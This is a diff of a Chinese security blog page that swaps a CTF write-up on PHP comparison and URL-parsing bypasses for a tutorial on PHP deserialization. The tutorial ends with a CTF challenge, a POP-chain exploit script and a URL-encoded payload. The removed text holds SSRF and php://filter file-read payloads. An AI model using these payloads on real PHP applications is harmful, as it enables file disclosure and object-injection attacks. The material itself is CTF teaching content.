@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="WP,">
+  <meta name="keywords" content="基础,">
 
 
 
@@ -81,29 +81,18 @@
 
 
 
-<meta name="description" content="杭电vidar的hgame，其中几道php的题，写一下学到的。">
-<meta name="keywords" content="WP">
+<meta name="description" content="php反序列化漏洞的整理PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。">
+<meta name="keywords" content="基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hgame(php)">
-<meta property="og:url" content="http://yoursite.com/2019/02/14/hgame-php/index.html">
+<meta property="og:title" content="php反序列化">
+<meta property="og:url" content="http://yoursite.com/2019/08/13/php反序列化/index.html">
 <meta property="og:site_name" content="木偶&#39;s blog">
-<meta property="og:description" content="杭电vidar的hgame，其中几道php的题，写一下学到的。">
+<meta property="og:description" content="php反序列化漏洞的整理PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/1.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/2.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/3.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/4.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/5.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/6.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/a.png">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/7.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/8.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/02/14/hgame-php/12.png">
-<meta property="og:updated_time" content="2019-08-02T09:01:38.615Z">
+<meta property="og:updated_time" content="2019-08-13T10:37:59.845Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hgame(php)">
-<meta name="twitter:description" content="杭电vidar的hgame，其中几道php的题，写一下学到的。">
-<meta name="twitter:image" content="http://yoursite.com/2019/02/14/hgame-php/1.jpg">
+<meta name="twitter:title" content="php反序列化">
+<meta name="twitter:description" content="php反序列化漏洞的整理PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。">
 
 
 
@@ -133,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/02/14/hgame-php/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/13/php反序列化/">
 
 
 
 
 
-  <title>hgame(php) | 木偶's blog</title>
+  <title>php反序列化 | 木偶's blog</title>
   
 
 
@@ -309,7 +298,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/14/hgame-php/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/php反序列化/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="木偶">
@@ -326,7 +315,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hgame(php)</h1>
+          <h1 class="post-title" itemprop="name headline">php反序列化</h1>
         
 
         <div class="post-meta">
@@ -338,8 +327,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-14T10:07:57+08:00">
-                2019-02-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-13T16:05:13+08:00">
+                2019-08-13
               </time>
             
 
@@ -361,8 +350,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WP/" itemprop="url" rel="index">
-                    <span itemprop="name">WP</span>
+                  <a href="/categories/基础/" itemprop="url" rel="index">
+                    <span itemprop="name">基础</span>
                   </a>
                 </span>
 
@@ -379,8 +368,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/02/14/hgame-php/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/02/14/hgame-php/" itemprop="commentCount"></span>
+                <a href="/2019/08/13/php反序列化/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/13/php反序列化/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -402,7 +391,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  657 字
+                  1.1k 字
                 </span>
               
 
@@ -418,7 +407,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  5 分钟
                 </span>
               
             </div>
@@ -439,22 +428,164 @@
       
 
       
-        <p>杭电vidar的hgame，其中几道php的题，写一下学到的。<br><a id="more"></a></p>
-<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p><img src="/2019/02/14/hgame-php/1.jpg" alt=" "></p>
-<p>十多个php的绕过，题目挂了，用了一个师傅博客里的图片（之前忘写了，懒~）  </p>
-<h5 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h5><p><img src="/2019/02/14/hgame-php/2.jpg" alt=" "><br>==和!=之间不会去判断数据类型，1和2又都被强制转换为了字符型，所以不能用数组，可用0e开头的MD5值绕过  </p>
-<h5 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h5><p><img src="/2019/02/14/hgame-php/3.jpg" alt=" "><br>===则会判断数据类型，两个必须完全相等才返回true，所以用数组绕过，不同值的数组都返回0（详细见<a href="https://blog.csdn.net/qq_19980431/article/details/83018232）" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232）</a></p>
-<h5 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h5><p><img src="/2019/02/14/hgame-php/4.jpg" alt=" "></p>
-<p>php里的特性+和.会被解析为_,所以H_game写为H+game,或者是$_SERVER[‘QUERY_STRING’] 是不会自动URLDecode 的，所以我们只需要传个URL编码过的参数名即可绕过这里</p>
-<h5 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h5><p><img src="/2019/02/14/hgame-php/5.jpg" alt=" ">  </p>
-<p>数组绕过</p>
-<h5 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h5><p><img src="/2019/02/14/hgame-php/6.jpg" alt=" "><br>这里被难住了，必须是http开头，开头的提示为admin.php,本来想着可以file协议忽略前面的地址直接读取文件内容，但是http的限制没法绕过<br><img src="/2019/02/14/hgame-php/a.png" alt=" "><br>parse_url 里的 PHP_URL_HOST 参数获取的是 最后一个@ 符号后面的域名，而 curl 使用的是第一个 @ 符号后面的域名，又有only localhost的提示，这样我们就可以用 http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php 来绕过,从而读取admin.php</p>
-<h5 id="（6）"><a href="#（6）" class="headerlink" title="（6）"></a>（6）</h5><p><img src="/2019/02/14/hgame-php/7.jpg" alt=" "><br>这里又卡住了，之前做bugku的时候对file_getcontent理解不到位，file_getcontent内容可以执行为协议，所以直接filename=php://filter/read=convert.base64-encode/resource=flag.php就可以绕过php_exits.</p>
-<h5 id="（7）"><a href="#（7）" class="headerlink" title="（7）"></a>（7）</h5><p><img src="/2019/02/14/hgame-php/8.jpg" alt=" "><br>最终payload为：str1=s878926199a&amp;str2=s155964671a&amp;str3[]=22&amp;str4[]=1&amp;H+game[]=9e10000000000%00&amp;url=http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<h2 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h2><p><img src="/2019/02/14/hgame-php/12.png" alt=" "><br>我们需要POST的参数，door，key，gate。但这里secret是未知的，所以我们需要对door进行处理使secert的值为空，对于hash_mac函数<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = FALSE ] ) : string<br>参数<br>algo：<br>要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。<br>data：<br>要进行哈希运算的消息。<br>key：<br>使用 HMAC 生成信息摘要时所使用的密钥<br>raw_output：设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。</p>
-<p>当data的数据为数组时，返回空，所以传入data[]=0,secret的值就变成了null，然后gate的值是对key进行shal256加密，密钥为空。key的值可以确定，这里又是MD5碰撞的问题，在网上找到了一篇博客，下附地址：<br><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2019</a><br>双MD5，得到key可取key=7r4lGXCH2Ksu2JNT3BYM<br>之后可求gate<br>php&gt; var_dump(hash_hmac(‘sha256’, ‘7r4lGXCH2Ksu2JNT3BYM’, NULL)) string(64) “81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1 36aa84fe6”  </p>
-<p>最终payloadgate=81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d2 14f136aa84fe6&amp;key=7r4lGXCH2Ksu2JNT3BYM&amp;door[]=1</p>
+        <h2 id="php反序列化漏洞的整理"><a href="#php反序列化漏洞的整理" class="headerlink" title="php反序列化漏洞的整理"></a>php反序列化漏洞的整理</h2><p>PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。</p>
+<p>PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。</p>
+<a id="more"></a>
+<h3 id="序列化格式解释"><a href="#序列化格式解释" class="headerlink" title="序列化格式解释"></a>序列化格式解释</h3><p>a - array  数组<br>b - boolean  布尔值<br>d - double  double类型<br>i - integer  整数<br>o - common object 公共对象<br>r - reference  引用<br>s - string  字符串<br>C - custom object  自定义对象<br>O - class   类<br>N - null  空<br>R - pointer reference  指针<br>U - unicode string  Unicode字符串  </p>
+<p>举例介绍：</p>
+<p>O:3:“foo”:2:{s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;}</p>
+<p>O:3: 参数类型为对象</p>
+<p>“foo”:2: 参数名为foo，有两个值</p>
+<p>S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.php</p>
+<p>s:4:”data”;s:5:”aaaaa”;} 长度为4的字符串data，长度为5的字符串aaaaa</p>
+<h3 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h3><pre><code>&lt;?php
 
+$data=[&apos;PHP&apos;,&apos;HTML&apos;,&apos;Java&apos;,&apos;Python&apos;];
+
+echo serialize($data);
+</code></pre><p>结果：</p>
+<pre><code>a:4:{i:0;s:3:&quot;PHP&quot;;i:1;s:4:&quot;HTML&quot;;i:2;s:4:&quot;Java&quot;;i:3;s:6:&quot;Python&quot;;}
+</code></pre><h3 id="指针序列化"><a href="#指针序列化" class="headerlink" title="指针序列化"></a>指针序列化</h3><p>之前国赛just soso中有一步绕过就利用了指针序列化  </p>
+<pre><code>if($this-&gt;token === $this-&gt;token_flag)  
+</code></pre><p>本来以为是伪随机数种子，后来发现只需在序列化中让$F-&gt;token=&amp;$F-&gt;token_flag;  </p>
+<p>&amp;表示取变量值，将两个变量的值在序列化反序列化过程中关联起来，就可以相等</p>
+<h3 id="php对象序列化"><a href="#php对象序列化" class="headerlink" title="php对象序列化"></a>php对象序列化</h3><p>php之所以会存在反序列化的漏洞原因是一些魔法函数</p>
+<pre><code>__construct():当一个类被创建时自动调用  
+__destruct():当一个类被销毁时自动调用  
+__invoke():当把一个类当作函数使用时自动调用  
+__tostring():当把一个类当作字符串使用时自动调用  
+__wakeup():当调用unserialize()函数时自动调用  
+__sleep():当调用serialize()函数时自动调用  
+__call():当要调用的方法不存在或权限不足时自动调用 
+</code></pre><p>同样在之前国赛的just soso中有一个<strong>wakeup()的绕过， </strong>wakeup()触发于unserilize()调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得wakeup函数失效。</p>
+<p>我们可以利用这种自动执行某些函数或方法的特性，执行我们相要的操作。</p>
+<h3 id="夏令营一道题目"><a href="#夏令营一道题目" class="headerlink" title="夏令营一道题目"></a>夏令营一道题目</h3><pre><code> &lt;?php
+include &apos;flag.php&apos;;
+class Deep{
+        public $m1;
+        public $m2;
+        public function __destruct(){
+                $this-&gt;m1-&gt;boy();
+        }
+}
+
+class Dark{
+        public $m1;
+        public $m2;
+        public function boy(){
+                $this-&gt;m1-&gt;next_door();
+        }
+}
+
+class Fantasy{
+        public $m1;
+        public $m2;
+        public function __call($next_door,$arr){
+                $s = $this-&gt;m1;
+                $s();
+        }
+}
+
+class Happy{
+        public $m1;
+        public $m2;
+        public function __invoke(){
+                $this-&gt;m2=&quot;cnss&quot;.$this-&gt;m1;
+        }
+}
+
+class New_year{
+        public $s1;
+        public $s2;
+        public function __toString(){
+                $this-&gt;s1-&gt;get_flag();
+                return &quot;1&quot;;
+        }
+}
+
+class GetFlag{
+    public function get_flag(){
+        global $flag;
+        echo $flag;
+        }
+}
+
+$a = $_GET[&apos;payload&apos;];
+unserialize($a);
+show_source(__FILE__);
+?&gt;
+</code></pre><p>反序列化脚本：  </p>
+<pre><code>&lt;?php
+
+class Deep{
+        public $m1;
+        public $m2;
+        public function __construct(){
+                $this-&gt;m1= new Dark();#可以直接赋值位Fantasy()
+        }
+        public function __destruct(){
+                $this-&gt;m1-&gt;boy();
+        }
+}
+
+class Dark{
+        public $m1;
+        public $m2;
+        public function __construct(){
+                $this-&gt;m1= new Fantasy();
+        }
+        public function boy(){
+                $this-&gt;m1-&gt;next_door();
+        }
+}
+
+class Fantasy{
+        public $m1;
+        public $m2;
+        public function __construct(){#无法调用next_door方法时，就调用__call方法， $this-&gt;m1-&gt;next_door();所以此处将m1赋值为Happy()类，无法调用next_door，自动调用call方法
+                $this-&gt;m1= new Happy();
+        }
+        public function __call($next_door,$arr){
+                $s = $this-&gt;m1;
+                $s();
+        }
+}
+
+class Happy{
+        public $m1;
+        public $m2;
+        public function __construct(){
+                $this-&gt;m1= new New_year();//由于__toString()方法，所以要将New_year作为字符串来使用
+        }
+        public function __invoke(){
+                $this-&gt;m2=&quot;cnss&quot;.$this-&gt;m1;//字符串拼接来使用__toString()中的get_flag()
+        }
+}
+
+class New_year{
+        public $s1;
+        public $s2;
+         public function __construct(){
+                $this-&gt;s1= new GetFlag();//get_flag()在GetFlag类中，所以要先将s1赋值为GetFlag()才能使用get_flag()
+        }
+        public function __toString(){
+                $this-&gt;s1-&gt;get_flag();
+                return &quot;1&quot;;
+        }
+}
+
+class GetFlag{
+    public function get_flag(){
+        global $flag;
+        echo $flag;
+        }
+}
+
+$a = new Deep;
+echo urlencode(serialize($a));
+</code></pre><p>payload：</p>
+<pre><code>O%3A4%3A%22Deep%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22Dark%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A7%3A%22Fantasy%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A8%3A%22New_year%22%3A2%3A%7Bs%3A2%3A%22s1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7Ds%3A2%3A%22s2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7D
+</code></pre>
       
     </div>
     
@@ -471,7 +602,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/WP/" rel="tag"># WP</a>
+            <a href="/tags/基础/" rel="tag"># 基础</a>
           
         </div>
       
@@ -484,8 +615,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/02/07/Python爬虫/" rel="next" title="Python爬虫">
-                <i class="fa fa-chevron-left"></i> Python爬虫
+              <a href="/2019/08/05/Xor异或解密/" rel="next" title="Xor异或解密">
+                <i class="fa fa-chevron-left"></i> Xor异或解密
               </a>
             
           </div>
@@ -494,8 +625,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/04/07/SSTI-1/" rel="prev" title="SSTI(1)">
-                SSTI(1) <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/13/mongodb注入/" rel="prev" title="mongodb注入">
+                mongodb注入 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -712,7 +843,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-trick"><span class="nav-number">1.</span> <span class="nav-text">php trick</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#（1）"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">（1）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（2）"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">（2）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（3）"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">（3）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（4）"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">（4）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（5）"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">（5）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（6）"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">（6）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#（7）"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">（7）</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#php-is-the-best-language"><span class="nav-number">2.</span> <span class="nav-text">php is the best language</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php反序列化漏洞的整理"><span class="nav-number">1.</span> <span class="nav-text">php反序列化漏洞的整理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化格式解释"><span class="nav-number">1.1.</span> <span class="nav-text">序列化格式解释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数组序列化"><span class="nav-number">1.2.</span> <span class="nav-text">数组序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指针序列化"><span class="nav-number">1.3.</span> <span class="nav-text">指针序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php对象序列化"><span class="nav-number">1.4.</span> <span class="nav-text">php对象序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#夏令营一道题目"><span class="nav-number">1.5.</span> <span class="nav-text">夏令营一道题目</span></a></li></ol></li></ol></div>
             
 
           </div>
